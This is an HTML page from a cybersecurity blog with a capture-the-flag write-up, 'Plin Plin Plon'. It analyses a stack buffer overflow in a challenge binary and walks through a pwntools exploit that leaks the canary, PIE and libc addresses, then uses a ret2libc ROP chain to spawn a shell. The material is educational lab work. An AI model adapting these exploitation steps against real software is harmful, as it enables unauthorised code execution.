@@ -1,0 +1,514 @@
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Plin Plin Plon — Zereza's Blog</title>
+  <meta name="description" content="Blog de ciberseguridad. Writeups, notas técnicas e investigación.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='8' fill='%230E1120'/><circle cx='16' cy='16' r='6' fill='none' stroke='%237EC8E3' stroke-width='2'/><circle cx='16' cy='16' r='2' fill='%237EC8E3'/></svg>">
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Plin Plin Plon | Zereza’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Plin Plin Plon" />
+<meta name="author" content="Miguel Peñaranda" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="Introduction" />
+<meta property="og:description" content="Introduction" />
+<link rel="canonical" href="http://0.0.0.0:4000/en/challenges/plin-plin-plon/" />
+<meta property="og:url" content="http://0.0.0.0:4000/en/challenges/plin-plin-plon/" />
+<meta property="og:site_name" content="Zereza’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-03-30T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Plin Plin Plon" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Miguel Peñaranda"},"dateModified":"2026-03-30T00:00:00+02:00","datePublished":"2026-03-30T00:00:00+02:00","description":"Introduction","headline":"Plin Plin Plon","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/en/challenges/plin-plin-plon/"},"url":"http://0.0.0.0:4000/en/challenges/plin-plin-plon/"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+<body>
+
+<nav class="nav">
+  <div class="nav__inner">
+    <a href="/en/" class="nav__logo">
+      <span class="nav__logo-dot"></span>
+      Zereza's Blog
+    </a>
+    <ul class="nav__links" id="nav-links">
+      <li><a href="/en/" >home</a></li>
+      <li><a href="/en/about/" >whoami</a></li>
+      <li><a href="/en/posts/" >posts</a></li>
+      <li><a href="/en/challenges/" class="active">challenges</a></li>
+    </ul>
+    <div class="nav__tools">
+      <div class="lang-switch" aria-label="Language switcher">
+        <a href="/challenges/plin-plin-plon/" >ES</a>
+        <a href="/en/challenges/plin-plin-plon/" class="active">EN</a>
+      </div>
+      <a href="https://github.com/mzereza" target="_blank" rel="noopener" class="nav__cta">github ↗</a>
+    </div>
+    <button class="nav__burger" onclick="document.getElementById('nav-links').classList.toggle('open')">≡</button>
+  </div>
+</nav>
+
+<main>
+
+
+<div class="page page--with-toc">
+  <aside class="toc-sidebar" id="toc-sidebar">
+    <div class="toc-sidebar__inner">
+      <span class="toc-sidebar__title">Contents</span>
+      <nav class="toc-nav" id="toc-nav"></nav>
+    </div>
+  </aside>
+
+  <article class="post-wrap">
+
+    <a href="/en/challenges/" class="post-back">← volver a challenges</a>
+
+    <header class="post-header">
+      <div class="post-header-tags">
+        
+      </div>
+      <h1>Plin Plin Plon</h1>
+      <div class="post-header-meta">
+        
+        <span>March 30, 2026</span>
+        
+        
+      </div>
+    </header>
+
+    
+
+    <div class="prose" id="prose-content">
+      <h2 id="introduction">Introduction</h2>
+
+<p>In this challenge we are provided with:</p>
+<ul>
+  <li>The binary <a href="/assets/scripts/plin-plin-plon/vuln"><strong>vuln</strong></a></li>
+  <li>A glibc <a href="/assets/scripts/plin-plin-plon/libc.so.6"><strong>libc.so.6</strong></a></li>
+  <li>A loader <a href="/assets/scripts/plin-plin-plon/ld-linux-x86-64.so.2"><strong>ld-linux-x86-64.so.2</strong></a></li>
+</ul>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<p>We start with the basic binary analysis, let’s run checksec to see what protections it has:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre>zereza@kali:~/plin-plin-plon<span class="nv">$ </span>checksec vuln
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    RUNPATH:    b<span class="s1">'.'</span>
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>We see the challenge has <strong>NX</strong>, <strong>Canary</strong>, <strong>PIE</strong> and <strong>Full RELRO</strong> protection. So we won’t be able to attack the <strong>GOT</strong> table and we’ll likely need to leak both the <strong>Canary</strong> and <strong>PIE</strong>.</p>
+
+<h2 id="analysis">Analysis</h2>
+
+<p>Analyzing the binary with <strong>Ghidra</strong>, we have the following pseudocode (I’ve renamed some variables):</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">plin</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">input</span> <span class="p">[</span><span class="mi">88</span><span class="p">];</span>
+  <span class="kt">long</span> <span class="n">canary</span><span class="p">;</span>
+  
+  <span class="n">canary</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">input</span><span class="p">,</span><span class="mh">0x80</span><span class="p">);</span>
+    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">input</span><span class="p">,</span><span class="s">"plin plin plon"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">canary</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">__stack_chk_fail</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">setup</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+  <span class="n">setup</span><span class="p">();</span>
+  <span class="n">plin</span><span class="p">();</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The program lets the user input a string of up to 0x80 bytes in a loop, and the program prints it with <code class="language-plaintext highlighter-rouge">puts</code>.
+There are two important notes here:</p>
+<ul>
+  <li>The string is read with <code class="language-plaintext highlighter-rouge">read</code>, so it doesn’t append a <code class="language-plaintext highlighter-rouge">\x00</code> at the end. <strong>This will be important for leaking.</strong></li>
+  <li><code class="language-plaintext highlighter-rouge">read</code> reads 0x80 bytes but the buffer is 88 bytes <em>(0x58 in hex)</em>. <strong>THERE IS A BUFFER OVERFLOW HERE!</strong></li>
+</ul>
+
+<p>The exploitation strategy will be:</p>
+<ol>
+  <li>Leak the <strong>Canary</strong>, <strong>PIE</strong> and <strong>LIBC</strong> with <code class="language-plaintext highlighter-rouge">read</code>.</li>
+  <li>Overwrite the <strong>Canary</strong> with the leak.</li>
+  <li>Overwrite the <strong>Saved return address</strong> with our <strong>ROP Chain</strong>.</li>
+  <li>Write “plin plin plon” to exit the loop and reach the <code class="language-plaintext highlighter-rouge">return</code>.</li>
+</ol>
+
+<h2 id="phase-1-leak">Phase 1: Leak</h2>
+
+<p>Before starting we need to know the offsets from the input to the <strong>Canary</strong> and the <strong>Saved ret</strong>. This can be easily determined with <strong>Ghidra</strong>:</p>
+<ul>
+  <li>The distance from input to the <strong>Saved ret</strong> is 0x68 bytes</li>
+  <li>The distance from input to the <strong>Canary</strong> is 0x58 bytes</li>
+</ul>
+
+<p>Now let’s build a python script to leak the values we need for our <strong>ROP</strong>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">binary</span> <span class="o">=</span> <span class="sh">"</span><span class="s">./vuln</span><span class="sh">"</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+
+<span class="n">offset_to_canary</span> <span class="o">=</span> <span class="mh">0x58</span>
+<span class="n">offset_to_ret</span> <span class="o">=</span> <span class="mh">0x68</span>
+
+<span class="c1"># Canary leak
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="p">(</span><span class="n">offset_to_canary</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># Offset to canary+1 to overwrite the canary's nullbyte
+</span><span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">offset_to_canary</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">7</span><span class="p">).</span><span class="nf">rjust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">CANARY --&gt; </span><span class="sh">"</span><span class="o">+</span><span class="nf">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
+
+<span class="c1"># PIE leak
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="n">offset_to_ret</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">offset_to_ret</span><span class="p">)</span>
+<span class="n">pie_leak</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">LEAK PIE --&gt; </span><span class="sh">"</span><span class="o">+</span><span class="nf">hex</span><span class="p">(</span><span class="n">pie_leak</span><span class="p">))</span>
+
+<span class="c1"># LIBC leak
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="p">(</span><span class="n">offset_to_ret</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">offset_to_ret</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">libc_leak</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">LEAK LIBC --&gt; </span><span class="sh">"</span><span class="o">+</span><span class="nf">hex</span><span class="p">(</span><span class="n">pie_leak</span><span class="p">))</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Now we need to go from the <strong>PIE</strong> and <strong>Libc</strong> leaks to their respective bases. This is trivial — just connect the binary to <strong>gdb</strong> after the leaks to get the bases, then calculate the offsets.</p>
+
+<p>Once the offsets are calculated, add the following lines to the exploit:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="n">offset_to_pie</span> <span class="o">=</span> <span class="o">-</span><span class="mh">0x12bb</span>
+<span class="n">offset_to_libc</span> <span class="o">=</span> <span class="o">-</span><span class="mh">0x29d90</span>
+
+<span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">pie_leak</span><span class="o">+</span><span class="n">offset_to_pie</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span><span class="o">+</span><span class="n">offset_to_libc</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Now we have everything we need to build the <strong>ROP</strong> — let’s do it!</p>
+
+<h2 id="phase-2-ropchain">Phase 2: ROPChain</h2>
+
+<p>Let’s build the typical <strong>ret2libc</strong> <strong>ROPChain</strong>: –&gt; <code class="language-plaintext highlighter-rouge">POP RDI; RET; /bin/sh ; system</code></p>
+
+<p>We can calculate the offsets manually or use <strong>pwntools</strong> — I’ll go with the latter.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="n">rop</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">"</span><span class="s">pop rdi</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">ret</span><span class="sh">"</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span>
+<span class="n">binsh</span> <span class="o">=</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">"</span><span class="p">))</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="n">offset_to_canary</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mh">0x8</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">plin plin plon</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>We run it and… <strong>IT FAILS!</strong> This is because the stack is not aligned to mod 16, which is a requirement for calling <code class="language-plaintext highlighter-rouge">system</code>, and we don’t have space to add more gadgets. To fix this we have two options: use a <strong>One Gadget</strong>, or align the stack using <code class="language-plaintext highlighter-rouge">plin</code>’s <code class="language-plaintext highlighter-rouge">return</code>. I’ll go with the second option.</p>
+
+<h2 id="phase-3-stack-alignment">Phase 3: Stack Alignment</h2>
+
+<p>The idea here is simple — we’ll do two payloads:</p>
+<ol>
+  <li>The first will overwrite the <strong>Saved return address</strong> with <code class="language-plaintext highlighter-rouge">plin</code>, so that when exiting it aligns the stack and returns to the vulnerable function.</li>
+  <li>With the stack aligned we’ll execute the previous payload with our <strong>ROP Chain</strong>, which will work now that the stack is aligned.</li>
+</ol>
+
+<p>Here we have the <code class="language-plaintext highlighter-rouge">plin</code> function. The idea is that in the first stage the final return calls <code class="language-plaintext highlighter-rouge">plin</code> again, aligning the stack for the next stage.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">plin</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">input</span> <span class="p">[</span><span class="mi">88</span><span class="p">];</span>
+  <span class="kt">long</span> <span class="n">canary</span><span class="p">;</span>
+  
+  <span class="n">canary</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">input</span><span class="p">,</span><span class="mh">0x80</span><span class="p">);</span>
+    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">input</span><span class="p">,</span><span class="s">"plin plin plon"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">canary</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">__stack_chk_fail</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span> <span class="cm">/* &lt;--- This return will call plin() again aligning the stack*/</span>
+<span class="p">}</span>
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The final part of the exploit looks like this:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre><span class="n">plin</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">plin</span>
+
+<span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="n">offset_to_canary</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">plin</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">plin plin plon</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">rop</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">"</span><span class="s">pop rdi</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">ret</span><span class="sh">"</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span>
+<span class="n">binsh</span> <span class="o">=</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">"</span><span class="p">))</span>
+
+<span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="n">offset_to_canary</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mh">0x8</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> 
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">plin plin plon</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>We run it and… <strong>WE HAVE A SHELL!</strong></p>
+
+<p><img src="/assets/img/challenges/plin-plin-plon/img0.png" alt="PoC Image" /></p>
+
+<h2 id="exploit">Exploit</h2>
+<p><strong>Thanks for making it to the end!</strong></p>
+
+<p>You can find the full exploit here: <a href="/assets/scripts/plin-plin-plon/exploit.py">exploit.py</a></p>
+
+    </div>
+
+    <nav class="post-nav">
+      <span></span>
+
+      
+      <a href="/en/challenges/plin-plon-plin/" class="post-nav-link" style="text-align:right;">
+        <span class="post-nav-dir">siguiente →</span>
+        <span class="post-nav-title">Plin Plon Plin</span>
+      </a>
+      
+    </nav>
+
+  </article>
+</div>
+
+<script>
+(function() {
+  var prose = document.getElementById('prose-content');
+  var nav   = document.getElementById('toc-nav');
+  if (!prose || !nav) return;
+
+  var headings = prose.querySelectorAll('h2, h3');
+  if (headings.length === 0) return;
+
+  var ul = document.createElement('ul');
+  ul.className = 'toc-list';
+
+  headings.forEach(function(h, i) {
+    if (!h.id) {
+      h.id = 'toc-' + i + '-' + h.textContent.trim().toLowerCase().replace(/[^\w\s-]/g, '').replace(/\s+/g, '-');
+    }
+    var li = document.createElement('li');
+    li.className = 'toc-item toc-item--' + h.tagName.toLowerCase();
+    var a = document.createElement('a');
+    a.href = '#' + h.id;
+    a.className = 'toc-link';
+    a.textContent = h.textContent;
+    li.appendChild(a);
+    ul.appendChild(li);
+  });
+
+  nav.appendChild(ul);
+
+  /* Active link highlight on scroll */
+  var links = nav.querySelectorAll('.toc-link');
+  var observer = new IntersectionObserver(function(entries) {
+    entries.forEach(function(entry) {
+      if (entry.isIntersecting) {
+        links.forEach(function(l) { l.classList.remove('toc-link--active'); });
+        var active = nav.querySelector('a[href="#' + entry.target.id + '"]');
+        if (active) active.classList.add('toc-link--active');
+      }
+    });
+  }, { rootMargin: '0px 0px -70% 0px', threshold: 0 });
+
+  headings.forEach(function(h) { observer.observe(h); });
+})();
+</script>
+</main>
+
+<footer class="footer">
+  <div class="footer__inner">
+    <div>
+      <div class="footer__brand">
+        <span class="footer__brand-dot"></span>
+        Zereza's Blog
+      </div>
+      <div class="footer__copy">© 2026 Miguel Peñaranda</div>
+    </div>
+    <div class="footer__links">
+      <a href="https://github.com/mzereza" target="_blank" rel="noopener">github</a>
+      <a href="https://linkedin.com/in/miguel-t-pe%C3%B1aranda-padilla-227076372" target="_blank" rel="noopener">linkedin</a>
+      <a href="mailto:mig.penaranda07@gmail.com">email</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
